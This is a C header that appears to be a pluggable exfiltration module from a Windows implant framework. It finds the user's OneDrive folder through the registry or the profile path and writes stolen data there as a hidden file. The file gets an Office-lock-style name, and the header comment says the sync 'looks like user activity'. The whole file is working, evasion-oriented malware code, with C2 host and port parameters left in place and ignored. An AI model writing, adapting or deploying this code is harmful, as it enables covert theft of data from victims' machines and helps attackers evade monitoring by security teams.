// chunk: exfil/cloud_onedrive
// depends: (none)
// provides: exfiltrate
// headers: windows.h, shlobj.h
// note: Drop file into OneDrive folder — syncs automatically, looks like user activity

#ifndef CHUNK_EXFIL_ONEDRIVE
#define CHUNK_EXFIL_ONEDRIVE

static int find_onedrive_path(char *out, int out_sz) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\OneDrive", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD sz = (DWORD)out_sz;
        DWORD type;
        if (RegQueryValueExA(hk, "UserFolder", NULL, &type, (BYTE *)out, &sz) == ERROR_SUCCESS) {
            RegCloseKey(hk);
            return 1;
        }
        RegCloseKey(hk);
    }

    char profile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", profile, MAX_PATH)) {
        snprintf(out, out_sz, "%s\\OneDrive", profile);
        DWORD attr = GetFileAttributesA(out);
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
            return 1;
    }
    return 0;
}

static int exfiltrate(const char *data, int len, const char *c2_host, int c2_port) {
    (void)c2_host; (void)c2_port;

    char od_path[MAX_PATH];
    if (!find_onedrive_path(od_path, sizeof(od_path)))
        return 0;

    char fname[64];
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(fname, sizeof(fname), "~$doc_%04d%02d%02d_%02d%02d.tmp",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

    char full_path[MAX_PATH];
    snprintf(full_path, sizeof(full_path), "%s\\Documents\\%s", od_path, fname);

    CreateDirectoryA(od_path, NULL);
    char docs_dir[MAX_PATH];
    snprintf(docs_dir, sizeof(docs_dir), "%s\\Documents", od_path);
    CreateDirectoryA(docs_dir, NULL);

    HANDLE hf = CreateFileA(full_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    DWORD written;
    WriteFile(hf, data, (DWORD)len, &written, NULL);
    CloseHandle(hf);

    return (int)written == len;
}

#endif
